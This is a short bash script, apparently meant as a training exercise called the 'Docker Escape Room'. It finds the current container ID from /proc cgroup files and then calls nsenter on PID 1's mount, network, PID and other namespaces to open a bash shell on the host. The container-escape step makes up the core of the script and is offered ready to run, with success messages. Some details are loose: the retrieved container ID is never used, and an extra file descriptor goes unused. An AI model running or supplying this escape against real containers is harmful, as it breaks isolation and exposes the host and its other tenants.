#!/bin/bash

LOG_FILE="escape_docker.log"

setup_logging() {
    touch "$LOG_FILE"
    exec 3>>"$LOG_FILE"
    exec 4>&1
}

main() {
    setup_logging
    log_info "Welcome to the Docker Escape Room!"
    log_info "In this exercise, you'll attempt to escape from a Docker container to the underlying host system."

    # Get the ID of the current Docker container
    container_id=$(get_container_id)

    if [ -n "$container_id" ]; then
        log_info "Your current Docker container ID is: $container_id"
        log_info "Attempting to escape from the container..."

        # Use nsenter to enter the host namespace
        escape_from_container "$container_id"

        if [ $? -eq 0 ]; then
            log_info "Congratulations! You've successfully escaped from the Docker container."
        else
            log_error "Oops! Something went wrong. Unable to escape from the Docker container."
        fi
    else
        log_error "Unable to retrieve the Docker container ID. Are you sure this script is running inside a Docker container?"
    fi
}

get_container_id() {
    methods=('/proc/1/cgroup' '/proc/self/cgroup')
    for method in "${methods[@]}"; do
        container_id=$(try_get_container_id "$method")
        [ -n "$container_id" ] && echo "$container_id" && return 0
    done
    return 1
}

try_get_container_id() {
    method="$1"
    if [ -e "$method" ]; then
        container_id=$(awk -F/ '/docker|kubepods/ {print $NF}' "$method")
        [ -n "$container_id" ] && echo "$container_id" && return 0
    fi
    return 1
}

escape_from_container() {
    container_id="$1"
    nsenter --target 1 --mount --uts --ipc --net --pid -- bash
    return $?
}

log_info() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [INFO]: $1" >&3
}

log_error() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [ERROR]: $1" >&3
}

main
